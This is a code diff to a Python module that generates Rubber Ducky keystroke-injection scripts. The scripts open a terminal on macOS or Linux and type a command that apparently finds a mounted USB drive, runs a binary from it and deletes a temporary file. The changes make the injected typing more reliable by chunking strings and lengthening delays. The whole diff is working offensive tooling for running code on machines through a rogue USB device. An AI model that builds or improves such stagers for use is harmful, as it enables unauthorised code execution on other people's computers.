@@ -85,8 +85,15 @@ def _ducky_script(*lines: str) -> str:
     return ''.join(line + '\n' for line in lines)
 
 
+_DUCKY_STRING_CHUNK = 64
+
+
 def _ducky_type_line(line: str) -> str:
-    return _ducky_script('STRING ' + line, 'ENTER')
+    parts = []
+    for start in range(0, len(line), _DUCKY_STRING_CHUNK):
+        parts.append('STRING ' + line[start : start + _DUCKY_STRING_CHUNK])
+    parts.append('ENTER')
+    return _ducky_script(*parts)
 
 
 class _BinaryMixin:
@@ -126,8 +133,7 @@ class _BinaryMixin:
                 'ENTER',
                 'DELAY 1800',
                 'DEFAULTCHARDELAY 10',
-                _ducky_type_line(cmd),
-            )
+            ) + _ducky_type_line(cmd)
 
         if target_os == 'macos':
             cmd = (
@@ -138,14 +144,14 @@ class _BinaryMixin:
                 ';rm -f /tmp/pa;break;fi;done'
             )
             return _ducky_script(
-                'DELAY 700',
+                'DELAY 900',
                 'GUI SPACE',
-                'DELAY 1000',
+                'DELAY 1200',
                 'STRING Terminal',
                 'ENTER',
-                'DELAY 2000',
-                _ducky_type_line(cmd),
-            )
+                'DELAY 3500',
+                'DEFAULTCHARDELAY 10',
+            ) + _ducky_type_line(cmd)
 
         cmd = (
             'for d in /media/$USER/* /run/media/$USER/* /mnt/*;'
@@ -158,9 +164,9 @@ class _BinaryMixin:
         return _ducky_script(
             'DELAY 700',
             'CTRL-ALT t',
-            'DELAY 2000',
-            _ducky_type_line(cmd),
-        )
+            'DELAY 2500',
+            'DEFAULTCHARDELAY 10',
+        ) + _ducky_type_line(cmd)
 
     def _stager_script(self, target_os: str) -> str:
         return self._usb_drive_stager_script(target_os)
